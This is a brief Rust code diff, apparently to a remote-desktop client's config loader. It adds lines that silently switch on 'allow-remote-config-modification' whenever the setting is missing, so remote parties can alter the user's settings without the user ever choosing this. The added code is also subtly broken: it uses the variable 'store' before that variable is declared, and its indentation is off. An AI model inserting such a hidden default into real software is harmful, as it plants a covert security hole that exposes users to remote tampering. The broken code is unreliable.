@@ -458,6 +458,10 @@ fn patch(path: PathBuf) -> PathBuf {
 impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
+                    if !config.options.contains_key("allow-remote-config-modification") {
+                config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+                store = true;
+            }
         let mut store = false;
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
